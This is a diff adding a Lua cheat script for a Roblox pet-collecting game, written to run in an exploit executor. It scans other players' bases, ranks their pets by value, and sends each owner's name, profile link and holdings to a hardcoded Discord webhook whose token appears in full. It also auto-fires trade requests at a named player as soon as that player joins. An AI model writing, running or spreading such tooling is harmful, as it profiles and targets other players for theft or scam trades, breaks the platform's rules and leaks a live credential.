@@ -1,0 +1,612 @@
+-- ╔══════════════════════════════════════════════════╗
+-- ║          WS SCOUT  —  Base Scanner              ║
+-- ║  Webhook de valor + Auto Trade ao entrar        ║
+-- ╚══════════════════════════════════════════════════╝
+
+-- ============================================================
+-- ⚙️  CONFIGURAÇÃO  ← EDITE AQUI
+-- ============================================================
+local CFG = {
+    -- Webhook do Discord (cole o seu aqui)
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1464823085776507104/F7fJtz-Uo1pQv_PG9Yltpt0mxeGq2NzMov8RL7n_yoPtDJBL2Ib_sR_5fDww2OdC_Acy",
+
+    -- Geração mínima (em /s) para enviar alerta
+    -- Ex: 10e6 = 10M/s, 50e6 = 50M/s, 1e9 = 1B/s
+    MIN_GEN_ALERT = 10e6,
+
+    -- Nick para enviar trade automático quando o cara entrar
+    -- Deixe "" para desativar o auto-trade
+    TRADE_TARGET_NICK = "jamesleeo3855",
+
+    -- Enviar webhook somente se o jogador for novo no servidor (evita spam)
+    ALERT_ONCE_PER_PLAYER = true,
+
+    -- Cooldown entre webhooks do mesmo jogador (segundos)
+    ALERT_COOLDOWN = 30,
+
+    -- Mostrar GUI de listagem in-game
+    SHOW_GUI = true,
+
+    -- Cor accent da GUI (cinza)
+    GUI_ACCENT = Color3.fromRGB(170, 170, 170),
+}
+-- ============================================================
+
+local Players           = game:GetService("Players")
+local RunService        = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService      = game:GetService("TweenService")
+local HttpService       = game:GetService("HttpService")
+local Workspace         = game:GetService("Workspace")
+local LocalPlayer       = Players.LocalPlayer
+local PlayerGui         = LocalPlayer:WaitForChild("PlayerGui")
+
+-- ── Módulos do jogo ─────────────────────────────────────────
+local Packages, Datas, Shared, Utils
+local Synchronizer, AnimalsData, AnimalsShared, NumberUtils
+
+local function loadModules()
+    Packages = ReplicatedStorage:WaitForChild("Packages",    10)
+    Datas    = ReplicatedStorage:WaitForChild("Datas",       10)
+    Shared   = ReplicatedStorage:WaitForChild("Shared",      10)
+    Utils    = ReplicatedStorage:FindFirstChild("Utils") or
+               (Shared and Shared:FindFirstChild("Utils"))
+
+    if not (Packages and Datas) then
+        warn("[WS SCOUT] Módulos não encontrados — o jogo pode ter mudado.")
+        return false
+    end
+
+    local ok1; ok1, Synchronizer  = pcall(require, Packages:WaitForChild("Synchronizer"))
+    local ok2; ok2, AnimalsData   = pcall(require, Datas:WaitForChild("Animals"))
+    local ok3; ok3, AnimalsShared = pcall(require, Shared and Shared:WaitForChild("Animals") or Datas:WaitForChild("AnimalsShared"))
+    local ok4; ok4, NumberUtils   = pcall(require, Utils and Utils:WaitForChild("NumberUtils") or Datas:WaitForChild("NumberUtils"))
+
+    if not (ok1 and ok2 and ok3 and ok4) then
+        warn("[WS SCOUT] Falha ao carregar módulos:", ok1,ok2,ok3,ok4)
+        return false
+    end
+    return true
+end
+
+if not loadModules() then return end
+
+-- ── Estado interno ──────────────────────────────────────────
+local allAnimals       = {}   -- {name, genValue, genText, mutation, traits, owner, plot, slot}
+local lastAnimalHash   = {}   -- plot.Name → hash
+local alertedPlayers   = {}   -- playerName → last_alert_tick
+local tradeSentTo      = {}   -- playerName → true
+local guiRows          = {}   -- referências da GUI
+
+-- ── Utilitários ─────────────────────────────────────────────
+local function getAnimalHash(al)
+    if not al then return "" end
+    local t = {}
+    for k, v in pairs(al) do
+        table.insert(t, tostring(k) .. tostring(v and v.Index or ""))
+    end
+    table.sort(t)
+    return table.concat(t, "|")
+end
+
+local function genToReadable(v)
+    if v >= 1e12 then return string.format("%.2fT", v/1e12)
+    elseif v >= 1e9  then return string.format("%.2fB", v/1e9)
+    elseif v >= 1e6  then return string.format("%.2fM", v/1e6)
+    elseif v >= 1e3  then return string.format("%.1fK", v/1e3)
+    else return tostring(math.floor(v)) end
+end
+
+-- ============================================================
+-- 🔔  WEBHOOK
+-- ============================================================
+local function sendWebhook(playerName, userId, pets)
+    if CFG.WEBHOOK_URL == "" or CFG.WEBHOOK_URL:find("SEU_WEBHOOK") then return end
+
+    -- Montar lista de pets
+    local lines = {}
+    local totalGen = 0
+    for _, pet in ipairs(pets) do
+        totalGen = totalGen + (pet.genValue or 0)
+        local line = string.format("**%s** — `$%s/s`", pet.name, genToReadable(pet.genValue))
+        if pet.mutation and pet.mutation ~= "None" then
+            line = line .. " ✨ " .. pet.mutation
+        end
+        if pet.traits and pet.traits ~= "None" then
+            line = line .. " ⭐ " .. pet.traits
+        end
+        table.insert(lines, line)
+    end
+
+    local profileUrl = "https://www.roblox.com/users/" .. tostring(userId) .. "/profile"
+
+    local embed = {
+        title = "🔎 Base Detectada — " .. playerName,
+        url   = profileUrl,
+        color = 5592405,  -- cinza
+        description = table.concat(lines, "\n"),
+        fields = {
+            {name="👤 Player",    value="[" .. playerName .. "](" .. profileUrl .. ")", inline=true},
+            {name="💰 Gen Total", value="$" .. genToReadable(totalGen) .. "/s",         inline=true},
+            {name="🐾 Pets",      value=tostring(#pets),                                inline=true},
+        },
+        footer = {text = "WS Scout • " .. os.date("%H:%M:%S")},
+    }
+
+    local body = HttpService:JSONEncode({embeds = {embed}})
+
+    task.spawn(function()
+        local ok, err = pcall(function()
+            local req = (syn and syn.request) or (http and http.request) or request
+            if req then
+                req({
+                    Url    = CFG.WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body   = body,
+                })
+            else
+                warn("[WS SCOUT] Executor não suporta request HTTP")
+            end
+        end)
+        if not ok then warn("[WS SCOUT] Webhook falhou:", err) end
+    end)
+end
+
+-- ============================================================
+-- 🤝  TRADE AUTOMÁTICO
+-- ============================================================
+local function sendAutoTrade(targetName)
+    if not targetName or targetName == "" then return end
+    local target = Players:FindFirstChild(targetName)
+    if not target then return end
+    if tradeSentTo[targetName] then return end
+    tradeSentTo[targetName] = true
+
+    task.spawn(function()
+        task.wait(1.5)
+        -- Tentar vários remotes de trade conhecidos no Brainrot
+        local remoteNames = {
+            "RE/Trade/SendRequest",
+            "RE/TradeService/Request",
+            "RE/Trading/Send",
+            "RE/Player/Trade",
+        }
+        local fired = false
+        for _, path in ipairs(remoteNames) do
+            pcall(function()
+                local parts = path:split("/")
+                local obj = ReplicatedStorage
+                for i = 2, #parts do
+                    obj = obj:FindFirstChild(parts[i])
+                    if not obj then error("not found") end
+                end
+                if obj and obj:IsA("RemoteEvent") then
+                    obj:FireServer(target)
+                    fired = true
+                end
+            end)
+            if fired then break end
+        end
+
+        -- Fallback: tentar pelo VirtualInputManager clicando no botão de trade
+        if not fired then
+            pcall(function()
+                -- Procurar o botão de trade na UI do jogo
+                for _, sg in ipairs(PlayerGui:GetChildren()) do
+                    local tradeBtn = sg:FindFirstChild("TradeButton", true)
+                        or sg:FindFirstChild("SendTrade", true)
+                    if tradeBtn then
+                        tradeBtn.MouseButton1Click:Fire()
+                        fired = true
+                        break
+                    end
+                end
+            end)
+        end
+
+        if fired then
+            print("[WS SCOUT] Trade enviado para " .. targetName)
+        else
+            warn("[WS SCOUT] Não foi possível enviar trade para " .. targetName ..
+                 " — remote não encontrado. Tente manualmente.")
+        end
+    end)
+end
+
+-- ============================================================
+-- 🔍  SCANNER DE BASE
+-- ============================================================
+local function getPlayerIdByName(name)
+    local p = Players:FindFirstChild(name)
+    return p and p.UserId or 0
+end
+
+local function checkAndAlert(ownerName, petsInBase)
+    if not CFG.ALERT_ONCE_PER_PLAYER and not CFG.ALERT_COOLDOWN then return end
+
+    -- Filtrar apenas pets acima do limiar
+    local valuablePets = {}
+    local hasValuable = false
+    for _, pet in ipairs(petsInBase) do
+        if pet.genValue >= CFG.MIN_GEN_ALERT then
+            hasValuable = true
+        end
+        table.insert(valuablePets, pet)
+    end
+
+    if not hasValuable then return end
+
+    -- Checar cooldown
+    local now = tick()
+    local lastAlert = alertedPlayers[ownerName] or 0
+    if now - lastAlert < CFG.ALERT_COOLDOWN then return end
+    alertedPlayers[ownerName] = now
+
+    local uid = getPlayerIdByName(ownerName)
+    sendWebhook(ownerName, uid, valuablePets)
+    print(string.format("[WS SCOUT] 🔔 Webhook enviado para base de %s (%d pets)", ownerName, #valuablePets))
+end
+
+local function scanSinglePlot(plot)
+    pcall(function()
+        local ch = Synchronizer:Get(plot.Name)
+        if not ch then return end
+
+        local al = ch:Get("AnimalList")
+        local hash = getAnimalHash(al)
+        if lastAnimalHash[plot.Name] == hash then return end
+        lastAnimalHash[plot.Name] = hash
+
+        -- Remover entradas antigas desse plot
+        for i = #allAnimals, 1, -1 do
+            if allAnimals[i].plot == plot.Name then table.remove(allAnimals, i) end
+        end
+
+        local owner = ch:Get("Owner")
+        if not owner then return end
+        local ownerName = (type(owner) == "table" and owner.Name)
+            or (typeof(owner) == "Instance" and owner.Name)
+            or tostring(owner)
+
+        -- Ignorar a própria base
+        if ownerName == LocalPlayer.Name then return end
+
+        -- Só escanear se o owner está no servidor
+        if not Players:FindFirstChild(ownerName) then return end
+
+        if not al then return end
+
+        local petsInBase = {}
+        for slot, ad in pairs(al) do
+            if type(ad) == "table" then
+                local aName = ad.Index
+                local aInfo = AnimalsData[aName]
+                if aInfo then
+                    local mut = ad.Mutation or "None"
+                    if mut == "Yin Yang" then mut = "YinYang" end
+                    local traits = (ad.Traits and #ad.Traits > 0) and table.concat(ad.Traits, ", ") or "None"
+                    local gv = AnimalsShared:GetGeneration(aName, ad.Mutation, ad.Traits, nil)
+                    local gt = "$" .. genToReadable(gv) .. "/s"
+                    local entry = {
+                        name      = aInfo.DisplayName or aName,
+                        genText   = gt,
+                        genValue  = gv,
+                        mutation  = mut,
+                        traits    = traits,
+                        owner     = ownerName,
+                        plot      = plot.Name,
+                        slot      = tostring(slot),
+                        uid       = plot.Name .. "_" .. tostring(slot),
+                    }
+                    table.insert(allAnimals, entry)
+                    table.insert(petsInBase, entry)
+                end
+            end
+        end
+
+        table.sort(allAnimals, function(a, b) return a.genValue > b.genValue end)
+
+        -- Alertar se tiver pet valioso
+        if #petsInBase > 0 then
+            checkAndAlert(ownerName, petsInBase)
+        end
+    end)
+end
+
+local function setupPlotListener(plot)
+    local ch, retries = nil, 0
+    while not ch and retries < 40 do
+        local ok, r = pcall(function() return Synchronizer:Get(plot.Name) end)
+        if ok and r then ch = r; break else retries = retries + 1; task.wait(0.15) end
+    end
+    if not ch then return end
+
+    scanSinglePlot(plot)
+
+    plot.DescendantAdded:Connect(function()
+        task.wait(0.2); scanSinglePlot(plot)
+    end)
+    plot.DescendantRemoving:Connect(function()
+        task.wait(0.2); scanSinglePlot(plot)
+    end)
+
+    -- Re-scan periódico
+    task.spawn(function()
+        while plot and plot.Parent do
+            task.wait(8)
+            scanSinglePlot(plot)
+        end
+    end)
+end
+
+-- Iniciar scanner
+task.spawn(function()
+    local plots = Workspace:WaitForChild("Plots", 12)
+    if not plots then warn("[WS SCOUT] Plots não encontrado"); return end
+
+    for _, p in ipairs(plots:GetChildren()) do
+        task.spawn(setupPlotListener, p)
+    end
+
+    plots.ChildAdded:Connect(function(p)
+        task.wait(0.5)
+        task.spawn(setupPlotListener, p)
+    end)
+
+    plots.ChildRemoved:Connect(function(p)
+        lastAnimalHash[p.Name] = nil
+        for i = #allAnimals, 1, -1 do
+            if allAnimals[i].plot == p.Name then table.remove(allAnimals, i) end
+        end
+    end)
+
+    print("[WS SCOUT] Scanner iniciado ✓")
+end)
+
+-- ============================================================
+-- 👤  AUTO TRADE quando jogador entra
+-- ============================================================
+Players.PlayerAdded:Connect(function(player)
+    local target = CFG.TRADE_TARGET_NICK
+    if target == "" then return end
+    if player.Name ~= target then return end
+    if tradeSentTo[target] then return end
+
+    print("[WS SCOUT] " .. target .. " entrou! Enviando trade...")
+    -- Dar tempo para o player carregar
+    task.wait(3)
+    sendAutoTrade(target)
+end)
+
+-- Também checar se já está no servidor
+task.spawn(function()
+    task.wait(2)
+    local target = CFG.TRADE_TARGET_NICK
+    if target == "" then return end
+    if Players:FindFirstChild(target) then
+        print("[WS SCOUT] " .. target .. " já está no servidor! Enviando trade...")
+        sendAutoTrade(target)
+    end
+end)
+
+-- ============================================================
+-- 🖥️  GUI IN-GAME — Lista de bases escaneadas
+-- ============================================================
+if not CFG.SHOW_GUI then goto skip_gui end
+
+if PlayerGui:FindFirstChild("WSScout_GUI") then
+    PlayerGui.WSScout_GUI:Destroy()
+end
+
+local sg = Instance.new("ScreenGui")
+sg.Name = "WSScout_GUI"
+sg.ResetOnSpawn = false
+sg.DisplayOrder = 50
+sg.Parent = PlayerGui
+
+-- Painel principal
+local panel = Instance.new("Frame", sg)
+panel.Size = UDim2.new(0, 280, 0, 460)
+panel.Position = UDim2.new(1, -296, 0, 60)
+panel.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+panel.BorderSizePixel = 0
+panel.ClipsDescendants = true
+Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 12)
+local panelStroke = Instance.new("UIStroke", panel)
+panelStroke.Color = Color3.fromRGB(45, 45, 45); panelStroke.Thickness = 1
+
+-- Header
+local header = Instance.new("Frame", panel)
+header.Size = UDim2.new(1, 0, 0, 42)
+header.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
+header.BorderSizePixel = 0
+Instance.new("UICorner", header).CornerRadius = UDim.new(0, 12)
+local hFix = Instance.new("Frame", header)
+hFix.Size = UDim2.new(1, 0, 0.5, 0); hFix.Position = UDim2.new(0, 0, 0.5, 0)
+hFix.BackgroundColor3 = Color3.fromRGB(16, 16, 16); hFix.BorderSizePixel = 0
+local hDiv = Instance.new("Frame", header)
+hDiv.Size = UDim2.new(1, -16, 0, 1); hDiv.Position = UDim2.new(0, 8, 1, -1)
+hDiv.BackgroundColor3 = Color3.fromRGB(30, 30, 30); hDiv.BorderSizePixel = 0
+
+-- Título
+local titleLbl = Instance.new("TextLabel", header)
+titleLbl.Size = UDim2.new(1, -80, 1, 0); titleLbl.Position = UDim2.new(0, 12, 0, 0)
+titleLbl.BackgroundTransparency = 1; titleLbl.Text = "WS Scout"
+titleLbl.Font = Enum.Font.GothamBlack; titleLbl.TextSize = 14
+titleLbl.TextColor3 = Color3.fromRGB(210, 210, 210); titleLbl.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Status dot
+local statusDot = Instance.new("Frame", header)
+statusDot.Size = UDim2.new(0, 8, 0, 8); statusDot.Position = UDim2.new(0, 142, 0.5, -4)
+statusDot.BackgroundColor3 = Color3.fromRGB(90, 90, 90); statusDot.BorderSizePixel = 0
+Instance.new("UICorner", statusDot).CornerRadius = UDim.new(1, 0)
+
+-- Contagem
+local countLbl = Instance.new("TextLabel", header)
+countLbl.Size = UDim2.new(0, 60, 1, 0); countLbl.Position = UDim2.new(1, -68, 0, 0)
+countLbl.BackgroundTransparency = 1; countLbl.Text = "0 pets"
+countLbl.Font = Enum.Font.GothamMedium; countLbl.TextSize = 10
+countLbl.TextColor3 = Color3.fromRGB(90, 90, 90); countLbl.TextXAlignment = Enum.TextXAlignment.Right
+
+-- Config mínima inline
+local minGenLbl = Instance.new("TextLabel", panel)
+minGenLbl.Size = UDim2.new(1, -16, 0, 16); minGenLbl.Position = UDim2.new(0, 8, 0, 44)
+minGenLbl.BackgroundTransparency = 1
+minGenLbl.Text = "Min: $" .. genToReadable(CFG.MIN_GEN_ALERT) .. "/s  |  Webhook: " ..
+    (CFG.WEBHOOK_URL:find("SEU_WEBHOOK") and "❌ Não configurado" or "✓ Ativo")
+minGenLbl.Font = Enum.Font.GothamMedium; minGenLbl.TextSize = 9
+minGenLbl.TextColor3 = Color3.fromRGB(75, 75, 75); minGenLbl.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Trade target label
+local tradeLbl = Instance.new("TextLabel", panel)
+tradeLbl.Size = UDim2.new(1, -16, 0, 14); tradeLbl.Position = UDim2.new(0, 8, 0, 60)
+tradeLbl.BackgroundTransparency = 1
+tradeLbl.Text = CFG.TRADE_TARGET_NICK ~= "" and ("Auto-trade: @" .. CFG.TRADE_TARGET_NICK) or "Auto-trade: desativado"
+tradeLbl.Font = Enum.Font.GothamMedium; tradeLbl.TextSize = 9
+tradeLbl.TextColor3 = Color3.fromRGB(75, 75, 75); tradeLbl.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Scroll de pets
+local scroll = Instance.new("ScrollingFrame", panel)
+scroll.Size = UDim2.new(1, -8, 1, -82); scroll.Position = UDim2.new(0, 4, 0, 78)
+scroll.BackgroundTransparency = 1; scroll.BorderSizePixel = 0
+scroll.ScrollBarThickness = 2; scroll.ScrollBarImageColor3 = Color3.fromRGB(50, 50, 50)
+scroll.CanvasSize = UDim2.new(0, 0, 0, 0); scroll.ScrollingDirection = Enum.ScrollingDirection.Y
+
+local layout = Instance.new("UIListLayout", scroll)
+layout.Padding = UDim.new(0, 3); layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    scroll.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 8)
+end)
+
+local pad = Instance.new("UIPadding", scroll)
+pad.PaddingTop = UDim.new(0, 4); pad.PaddingBottom = UDim.new(0, 4)
+
+-- Drag no header
+local dragging, dragStart, startPos
+header.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true; dragStart = input.Position; startPos = panel.Position
+        input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
+    end
+end)
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        panel.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset+delta.X, startPos.Y.Scale, startPos.Y.Offset+delta.Y)
+    end
+end)
+
+-- Função que cria uma linha de pet na GUI
+local lastRenderedCount = -1
+
+local function rebuildGUI()
+    -- Limpar
+    for _, ch in ipairs(scroll:GetChildren()) do
+        if ch:IsA("Frame") then ch:Destroy() end
+    end
+
+    local shown = 0
+    local currentOwner = ""
+
+    for i, pet in ipairs(allAnimals) do
+        if shown >= 80 then break end  -- limite visual
+
+        -- Cabeçalho de owner se mudou
+        if pet.owner ~= currentOwner then
+            currentOwner = pet.owner
+            local ownerRow = Instance.new("Frame", scroll)
+            ownerRow.Size = UDim2.new(1, -6, 0, 20)
+            ownerRow.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+            ownerRow.BorderSizePixel = 0; ownerRow.LayoutOrder = i * 10 - 1
+            Instance.new("UICorner", ownerRow).CornerRadius = UDim.new(0, 6)
+            local ownerLbl = Instance.new("TextLabel", ownerRow)
+            ownerLbl.Size = UDim2.new(1, -8, 1, 0); ownerLbl.Position = UDim2.new(0, 6, 0, 0)
+            ownerLbl.BackgroundTransparency = 1
+            ownerLbl.Text = "👤 " .. pet.owner
+            ownerLbl.Font = Enum.Font.GothamBold; ownerLbl.TextSize = 10
+            ownerLbl.TextColor3 = Color3.fromRGB(150, 150, 150); ownerLbl.TextXAlignment = Enum.TextXAlignment.Left
+        end
+
+        local isValuable = pet.genValue >= CFG.MIN_GEN_ALERT
+
+        local row = Instance.new("Frame", scroll)
+        row.Size = UDim2.new(1, -6, 0, 46)
+        row.BackgroundColor3 = isValuable and Color3.fromRGB(24, 24, 24) or Color3.fromRGB(16, 16, 16)
+        row.BorderSizePixel = 0; row.LayoutOrder = i * 10
+        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 8)
+        if isValuable then
+            local rs = Instance.new("UIStroke", row); rs.Color = Color3.fromRGB(120, 120, 120); rs.Thickness = 1
+        end
+
+        -- Barra lateral (destaque se valioso)
+        local bar = Instance.new("Frame", row)
+        bar.Size = UDim2.new(0, 3, 0.5, 0); bar.Position = UDim2.new(0, 5, 0.25, 0)
+        bar.BackgroundColor3 = isValuable and Color3.fromRGB(200, 200, 200) or Color3.fromRGB(50, 50, 50)
+        bar.BorderSizePixel = 0
+        Instance.new("UICorner", bar).CornerRadius = UDim.new(1, 0)
+
+        -- Nome do pet
+        local nameLbl = Instance.new("TextLabel", row)
+        nameLbl.Size = UDim2.new(0.62, 0, 0, 18); nameLbl.Position = UDim2.new(0, 16, 0, 5)
+        nameLbl.BackgroundTransparency = 1; nameLbl.Text = pet.name
+        nameLbl.Font = Enum.Font.GothamBold; nameLbl.TextSize = 11
+        nameLbl.TextColor3 = isValuable and Color3.fromRGB(210, 210, 210) or Color3.fromRGB(140, 140, 140)
+        nameLbl.TextXAlignment = Enum.TextXAlignment.Left
+
+        -- Geração
+        local genLbl = Instance.new("TextLabel", row)
+        genLbl.Size = UDim2.new(0.38, -4, 0, 18); genLbl.Position = UDim2.new(0.62, 0, 0, 5)
+        genLbl.BackgroundTransparency = 1; genLbl.Text = pet.genText
+        genLbl.Font = Enum.Font.GothamBold; genLbl.TextSize = 11
+        genLbl.TextColor3 = isValuable and Color3.fromRGB(195, 195, 195) or Color3.fromRGB(95, 95, 95)
+        genLbl.TextXAlignment = Enum.TextXAlignment.Right
+
+        -- Mutação + traits
+        local mutText = ""
+        if pet.mutation ~= "None" then mutText = "✨ " .. pet.mutation end
+        if pet.traits   ~= "None" then mutText = mutText .. (mutText~="" and " · " or "") .. "⭐ " .. pet.traits end
+        if mutText == "" then mutText = "Sem mutação" end
+
+        local mutLbl = Instance.new("TextLabel", row)
+        mutLbl.Size = UDim2.new(1, -20, 0, 14); mutLbl.Position = UDim2.new(0, 16, 0, 26)
+        mutLbl.BackgroundTransparency = 1; mutLbl.Text = mutText
+        mutLbl.Font = Enum.Font.GothamMedium; mutLbl.TextSize = 9
+        mutLbl.TextColor3 = Color3.fromRGB(80, 80, 80); mutLbl.TextXAlignment = Enum.TextXAlignment.Left
+        mutLbl.TextTruncate = Enum.TextTruncate.AtEnd
+
+        shown = shown + 1
+    end
+
+    countLbl.Text = tostring(#allAnimals) .. " pets"
+    -- Dot verde se tiver conteúdo
+    statusDot.BackgroundColor3 = #allAnimals > 0 and Color3.fromRGB(160, 160, 160) or Color3.fromRGB(60, 60, 60)
+end
+
+-- Atualizar GUI periodicamente
+task.spawn(function()
+    while true do
+        task.wait(1)
+        if #allAnimals ~= lastRenderedCount then
+            lastRenderedCount = #allAnimals
+            rebuildGUI()
+        end
+    end
+end)
+
+::skip_gui::
+
+-- ============================================================
+-- 📋  PRINT DE STATUS
+-- ============================================================
+print([[
+╔══════════════════════════════════════╗
+║         WS SCOUT  —  ativo          ║
+╠══════════════════════════════════════╣
+║  Scanner de bases iniciado           ║
+║  Webhook: ]] .. (CFG.WEBHOOK_URL:find("SEU_WEBHOOK") and "NÃO configurado ❌   " or "Configurado ✓       ") .. [[║
+║  Min gen: $]] .. string.format("%-22s", genToReadable(CFG.MIN_GEN_ALERT) .. "/s") .. [[║
+║  Auto-trade: ]] .. string.format("%-19s", CFG.TRADE_TARGET_NICK ~= "" and "@"..CFG.TRADE_TARGET_NICK or "desativado") .. [[║
+╚══════════════════════════════════════╝
+]])
